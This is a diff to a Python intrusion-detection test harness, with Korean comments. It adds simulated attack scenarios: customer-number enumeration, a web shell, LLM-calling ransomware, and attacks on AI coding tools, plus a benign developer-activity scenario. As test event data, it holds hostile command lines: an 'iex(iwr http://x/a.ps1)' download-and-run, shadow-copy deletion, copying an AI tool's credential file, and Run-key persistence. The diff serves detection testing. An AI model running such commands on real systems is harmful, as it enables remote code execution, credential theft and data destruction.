@@ -8,6 +8,10 @@
  - 시나리오 E: 내가 쓰는 AI 도구(Claude Code)가 비슷한 명령을 씀 → 빨간 경보 없이 기록만
  - 수집기 파서: 4688 · Sysmon XML(1·3·22) · IIS/nginx 로그 줄
  - 평소 패턴 학습: 학습한 행동은 조용, 처음 보는 행동이 몰리면 '확인 필요'
+ - v1.1 시나리오 F: 금융권 웹 침투형 (고객번호 열거 → 웹쉘 → 로그 탈취)
+ - v1.1 시나리오 G: LLM 을 부르는 악성코드 + 자동 실행 + 랜섬웨어 준비 · 대량 암호화
+ - v1.1 시나리오 H: AI 코딩 도구 공격 (GitSpawn · 설치 스크립트 · AI 토큰 탈취)
+ - v1.1 시나리오 I: 정상 개발 · 운영 (git 훅 · npm 설치 · 프로그램 설치 · 웹 배포 · 내 AI 도구) → 빨간 경보 없어야 함
 """
 import json
 import os
@@ -46,7 +50,8 @@ def run(title, steps, det, clock):
     for label, kind, ev, wait in steps:
         clock.tick(wait)
         fn = {"logon": det.on_logon, "process": det.on_process, "network": det.on_network,
-              "weblog": det.on_weblog, "dns": det.on_dns}[kind]
+              "weblog": det.on_weblog, "dns": det.on_dns, "file": det.on_file, "registry": det.on_registry,
+              "psblock": det.on_script, "object_access": det.on_object_access}[kind]
         alerts = fn(ev)
         tag = ", ".join(f"{s}:{r}" for s, r, _, _ in alerts) or "-"
         print(f"[{clock().strftime('%H:%M:%S')}] {label:38} → {tag}")
@@ -151,6 +156,94 @@ def scenario_local_ai():
     return run("시나리오 E: 내가 쓰는 AI 도구 (외부 침입 아님)", steps, det, clock)
 
 
+def scenario_web():
+    clock = Clock(datetime(2026, 10, 21, 2, 0, 0))
+    det = RuleDetector(CFG, now_fn=clock)
+    ip = "45.9.7.33"
+    steps = []
+    for i in range(32):
+        steps.append((f"조회 custNo {i + 1}", "weblog",
+                      {"src_ip": ip, "path": f"/loan/agent/status?custNo=10{48230 + i * 7}", "ua": "Mozilla/5.0"}, 1))
+    steps += [("웹쉘 업로드 (Sysmon 11)", "file", {"pid": 4000, "process": "w3wp.exe",
+                                                "exe": r"C:\Windows\System32\inetsrv\w3wp.exe",
+                                                "path": r"C:\inetpub\wwwroot\upload\help.aspx"}, 5),
+              ("웹쉘 → 로그 압축", "process", proc(7101, 4000, "powershell.exe", "w3wp.exe",
+                                             r"powershell Compress-Archive C:\inetpub\logs\LogFiles C:\Users\Public\l.zip"), 6)]
+    return run("시나리오 F: 금융권 웹 침투형", steps, det, clock)
+
+
+def scenario_llm():
+    clock = Clock(datetime(2026, 10, 21, 3, 0, 0))
+    det = RuleDetector(CFG, now_fn=clock)
+    W = {**proc(7201, 6100, "wscript.exe", "winword.exe", r"wscript.exe C:\Users\Public\report.vbs"),
+         "exe": r"C:\Windows\System32\wscript.exe"}
+    steps = [("Word → wscript", "process", W, 0),
+             ("wscript → LLM API", "network", {**net("outbound", "18.239.50.10", 443, 53110, "wscript.exe",
+                                                    ai_domain="router.huggingface.co"), "pid": 7201}, 2),
+             ("LLM 응답 뒤 명령", "process", proc(7202, 7201, "cmd.exe", "wscript.exe", "cmd /c systeminfo"), 3),
+             ("Run 키 등록 (Sysmon 13)", "registry", {"pid": 7201, "process": "wscript.exe", "exe": r"C:\Windows\System32\wscript.exe",
+                                                    "key": r"HKU\S-1-5-21\Software\Microsoft\Windows\CurrentVersion\Run\Updater",
+                                                    "value": r"wscript.exe C:\Users\Public\report.vbs"}, 2),
+             ("PowerShell 4104: Gemini 호출", "psblock", {"block_id": "b1", "text":
+                 "$r = Invoke-RestMethod -Uri 'https://generativelanguage.googleapis.com/v1beta/models/x:generateContent' -Method Post"}, 2),
+             ("백업 삭제", "process", proc(7203, 7201, "vssadmin.exe", "wscript.exe", "vssadmin delete shadows /all /quiet"), 2)]
+    for i in range(55):
+        steps.append((f"암호화 파일 {i + 1}", "file", {"pid": 7300, "process": "svc.exe", "exe": r"C:\Users\Public\svc.exe",
+                                                   "path": f"C:\\Users\\kim\\Documents\\보고서{i}.docx.r4nd"}, 0.5))
+    return run("시나리오 G: LLM 을 부르는 악성코드 · 랜섬웨어", steps, det, clock)
+
+
+def scenario_coding_agent():
+    clock = Clock(datetime(2026, 10, 21, 4, 0, 0))
+    det = RuleDetector(CFG, now_fn=clock)
+    anc_cc = [{"pid": 900, "name": "node.exe", "cmdline": "node C:\\npm\\node_modules\\@anthropic-ai\\claude-code\\cli.js"}]
+    steps = [("GitSpawn: git → powershell", "process",
+              {**proc(8101, 8100, "powershell.exe", "git.exe", "powershell -nop -c iex(iwr http://x/a.ps1)"),
+               "ancestors": [{"pid": 8100, "name": "git.exe", "cmdline": "git status"}] + anc_cc}, 0),
+             ("npm 설치 중 다운로드", "process",
+              {**proc(8201, 8200, "powershell.exe", "cmd.exe", "powershell -enc SQBFAFgA"),
+               "ancestors": [{"pid": 8200, "name": "cmd.exe", "cmdline": "cmd /c node install.js"},
+                             {"pid": 8199, "name": "node.exe", "cmdline": "npm install colors-helper"}]}, 5),
+             ("인포스틸러: 토큰 복사", "process",
+              {**proc(8301, 8300, "cmd.exe", "upd.exe", r"cmd /c copy %USERPROFILE%\.claude\.credentials.json C:\Users\Public\c.dat"),
+               "exe": r"C:\Windows\System32\cmd.exe"}, 5),
+             ("4663: 낯선 프로그램이 MCP 설정 읽음", "object_access",
+              {"object": r"C:\Users\kim\.cursor\mcp.json", "process": "upd.exe", "pid": 8300}, 3)]
+    return run("시나리오 H: AI 코딩 도구 공격", steps, det, clock)
+
+
+def scenario_normal_dev():
+    clock = Clock(datetime(2026, 10, 21, 14, 0, 0))
+    det = RuleDetector(CFG, now_fn=clock)
+    anc_cc = [{"pid": 900, "name": "node.exe", "cmdline": "node C:\\npm\\node_modules\\@anthropic-ai\\claude-code\\cli.js"}]
+    steps = [("git 훅 (sh)", "process", {**proc(9101, 9100, "sh.exe", "git.exe", "sh .git/hooks/pre-commit"),
+                                         "ancestors": [{"pid": 9100, "name": "git.exe", "cmdline": "git commit"}]}, 0),
+             ("git → https 원격", "process", proc(9102, 9100, "git-remote-https.exe", "git.exe", "git-remote-https origin"), 2),
+             ("npm 설치 → node-gyp", "process", {**proc(9201, 9200, "cmd.exe", "node.exe", "cmd /c node-gyp rebuild"),
+                                                "ancestors": [{"pid": 9200, "name": "node.exe", "cmdline": "npm install"}]}, 5),
+             ("msiexec 가 Run 키 등록", "registry", {"pid": 9300, "process": "msiexec.exe", "exe": r"C:\Windows\System32\msiexec.exe",
+                                                  "key": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Zoom",
+                                                  "value": r"\"C:\Program Files\Zoom\bin\Zoom.exe\" --autostart"}, 5),
+             ("배포 도구가 웹 폴더에 파일", "file", {"pid": 9400, "process": "msdeploy.exe", "exe": r"C:\Program Files\IIS\msdeploy.exe",
+                                               "path": r"C:\inetpub\wwwroot\app\Default.aspx"}, 5),
+             ("Claude Code 가 자기 토큰 읽음 (4663)", "object_access",
+              {"object": r"C:\Users\kim\.claude\.credentials.json", "process": "node.exe", "pid": 900}, 2),
+             ("git checkout 으로 .ts 파일 다량 생성", "file", {"pid": 9500, "process": "git.exe", "exe": r"C:\Program Files\Git\bin\git.exe",
+                                                          "path": r"C:\Users\kim\src\app\index.ts"}, 1),
+             ("웹 페이지 정상 탐색", "weblog", {"src_ip": "45.9.8.1", "path": "/loan/agent/status?custNo=1048230", "ua": "Mozilla/5.0"}, 1),
+             ("Claude Code 가 LLM 접속 후 명령", "network", {**net("outbound", "160.79.104.10", 443, 53300, "node.exe",
+                                                                  ai_domain="api.anthropic.com"), "pid": 900}, 1),
+             ("  → cmd 실행", "process", {**proc(9601, 900, "cmd.exe", "node.exe", "cmd /c git status"), "ancestors": anc_cc}, 2),
+             ("PowerShell 4104: 정상 관리 스크립트", "psblock", {"block_id": "n1", "text": "Get-Service | Where-Object Status -eq Running"}, 1),
+             ("관리자가 로그 압축 (웹 서버와 무관)", "process", {**proc(9701, 9700, "powershell.exe", "explorer.exe",
+                                                               r"powershell Compress-Archive C:\inetpub\logs\LogFiles D:\backup\logs.zip"),
+                                                         "ancestors": [{"pid": 9700, "name": "explorer.exe", "cmdline": ""}]}, 2)]
+    for i in range(60):
+        steps.append(("", "file", {"pid": 9500, "process": "git.exe", "exe": r"C:\Program Files\Git\bin\git.exe",
+                                   "path": f"C:\\Users\\kim\\src\\app\\m{i}.ts"}, 0.2))
+    return run("시나리오 I: 정상 개발 · 운영", steps, det, clock)
+
+
 def test_parsers():
     print("\n=== 수집기 파서 ===")
     ok = True
@@ -175,6 +268,28 @@ def test_parsers():
     k3, e3 = sysmon_to_event(*[v for i, v in enumerate(parse_sysmon_xml(x3)) if i != 1])
     o2 = o2 and k3 == "network" and e3["kind"] == "outbound" and e3["raddr_ip"] == "38.244.50.120" and e3["raddr_port"] == 18899
     print(f"  Sysmon 3    → {e3['process']} → {e3['raddr_ip']}:{e3['raddr_port']} {'OK' if o2 else 'FAIL'}")
+    from collectors import parse_4663, ps4104_to_event
+    ns = "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><EventID>{}</EventID><EventRecordID>9</EventRecordID></System><EventData>{}</EventData></Event>"
+    x11 = ns.format(11, "<Data Name='Image'>C:\\Windows\\System32\\inetsrv\\w3wp.exe</Data><Data Name='ProcessId'>4000</Data>"
+                        "<Data Name='TargetFilename'>C:\\inetpub\\wwwroot\\a.aspx</Data>")
+    e11 = sysmon_to_event(*[v for i, v in enumerate(parse_sysmon_xml(x11)) if i != 1])
+    x13 = ns.format(13, "<Data Name='EventType'>SetValue</Data><Data Name='Image'>C:\\Windows\\System32\\wscript.exe</Data>"
+                        "<Data Name='ProcessId'>7201</Data><Data Name='TargetObject'>HKU\\S-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\U</Data>"
+                        "<Data Name='Details'>wscript.exe C:\\Users\\Public\\r.vbs</Data>")
+    e13 = sysmon_to_event(*[v for i, v in enumerate(parse_sysmon_xml(x13)) if i != 1])
+    x4104 = ns.format(4104, "<Data Name='MessageNumber'>1</Data><Data Name='ScriptBlockText'>Get-Date</Data><Data Name='ScriptBlockId'>abc</Data>")
+    e4104 = ps4104_to_event(*[v for i, v in enumerate(parse_sysmon_xml(x4104)) if i != 1])
+    e4663 = parse_4663(["S-1", "kim", "PC", "0x1", "Security", "File", r"C:\Users\kim\.cursor\mcp.json", "0x4",
+                        "%%4416", "0x1", "0x1f40", r"C:\Users\Public\upd.exe"])
+    o5 = (e11[0] == "file" and e11[1]["process"] == "w3wp.exe" and e11[1]["path"].endswith("a.aspx")
+          and e13[0] == "registry" and e13[1]["key"].endswith("Run\\U") and e4104[1]["text"] == "Get-Date"
+          and e4663["process"] == "upd.exe" and e4663["pid"] == 0x1f40 and e4663["object"].endswith("mcp.json"))
+    print(f"  Sysmon 11·13 · 4104 · 4663 → {'OK' if o5 else 'FAIL'}")
+    w2 = parse_w3c_line("2026-10-21 02:00:01 10.0.0.5 GET /loan/status custNo=1048230 443 - 45.9.7.33 Mozilla/5.0 - 200 0 0 12",
+                        "date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken".split())
+    o5 = o5 and w2["path"] == "/loan/status?custNo=1048230"
+    print(f"  IIS 쿼리 포함 → {w2['path']} {'OK' if o5 else 'FAIL'}")
+    o2 = o2 and o5
     fields = "date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken".split()
     w = parse_w3c_line("2026-10-19 03:00:01 10.0.0.5 GET /main.js - 443 - 198.51.100.7 Mozilla/5.0+(spa-api-recon) - 200 0 0 12", fields)
     o3 = w and w["ua"] == "Mozilla/5.0 (spa-api-recon)" and w["src_ip"] == "198.51.100.7"
@@ -236,6 +351,10 @@ if __name__ == "__main__":
     e = scenario_local_ai()
     parsers = test_parsers()
     base_ok = test_baseline()
+    f_ = scenario_web()
+    g_ = scenario_llm()
+    h_ = scenario_coding_agent()
+    i_ = scenario_normal_dev()
     judged = judge_check(c)
     expect = {"port_scan", "ioc_ip_match", "webserver_spawned_shell", "recon_burst"}
     expect_c = {"artex_user_agent", "distributed_ips", "agent_command_style", "retry_loop", "payload_staging",
@@ -250,6 +369,16 @@ if __name__ == "__main__":
         miss += r not in c
     print(f"  {'OK ' if 'artex_host_artifact' in d else 'MISS'} D artex_host_artifact")
     miss += "artex_host_artifact" not in d
+    for tag, got, want in (("F", f_, {"object_enumeration", "webshell_file_created", "log_theft"}),
+                           ("G", g_, {"llm_malware_pattern", "llm_then_exec", "autorun_change", "ransomware_prep", "mass_file_change"}),
+                           ("H", h_, {"git_spawned_unusual", "package_install_exec", "agent_secret_access"})):
+        for r in sorted(want):
+            print(f"  {'OK ' if r in got else 'MISS'} {tag} {r}")
+            miss += r not in got
+    i_intr = [r for r in i_ if r in INTRUSION_RULES]
+    print(f"  정상 개발·운영(I) → 빨간 경보 {len(i_intr)}건 ({'OK' if not i_intr else '오탐: ' + ', '.join(i_intr)})"
+          f" · 기록만: {', '.join(sorted(set(i_))) or '없음'}")
+    miss += len(i_intr)
     e_intr = [r for r in e if r in INTRUSION_RULES]
     print(f"  정상 사용 알림 수: {len(b)} ({'OK' if not b else '오탐 있음: ' + ', '.join(b)})")
     print(f"  내 AI 도구 사용 → 빨간 경보 {len(e_intr)}건 ({'OK' if not e_intr else '오탐: ' + ', '.join(e_intr)})"
